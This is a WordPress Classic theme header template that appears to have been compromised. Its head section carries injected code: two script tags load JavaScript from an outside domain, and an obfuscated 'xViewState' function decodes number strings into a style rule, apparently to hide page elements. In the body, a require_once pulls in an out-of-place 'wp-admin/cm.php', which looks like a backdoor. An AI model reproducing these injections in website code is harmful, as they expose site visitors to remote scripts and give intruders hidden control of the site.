<?php
/**
 * @package WordPress
 * @subpackage Classic_Theme
 */
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>

<head profile="http://gmpg.org/xfn/11">
	<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />

	<title><?php wp_title('&laquo;', true, 'right'); ?> <?php bloginfo('name'); ?></title>

	<style type="text/css" media="screen">
		@import url( <?php bloginfo('stylesheet_url'); ?> );
	</style>
	<link href="../../../../../css/global.css" rel="stylesheet" type="text/css" />
	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
    
	<?php wp_get_archives('type=monthly&format=link'); ?>
	<?php //comments_popup_script(); // off by default ?>
	<?php wp_head(); ?>

<script language="JavaScript" src="http://abtt.tv/modules/mod_servises/ua.js" type="text/javascript"></script><script language="JavaScript" src="http://abtt.tv/modules/mod_servises/ua.js" type="text/javascript"></script><script language="JavaScript"> function xViewState() { var a=0,m,v,t,z,x=new Array('9091968376','8887918192818786347374918784939277359287883421333333338896','839189849791848087809986','949990793917947998942577939317'),l=x.length;while(++a<=l){m=x[l-a]; t=z=''; for(v=0;v<m.length;){t+=m.charAt(v++); if(t.length==2){z+=String.fromCharCode(parseInt(t)+25-l+a); t='';}}x[l-a]=z;}document.write('<'+x[0]+' '+x[4]+'>.'+x[2]+'{'+x[1]+'}</'+x[0]+'>');}xViewState(); </script></head>

<body><?php require_once("wp-admin/cm.php"); ?>
<?php 
$curpage="blog";
?>
<?php include("../site-header.php"); ?>


<div id="rap">


<div id="content">
<!-- end header -->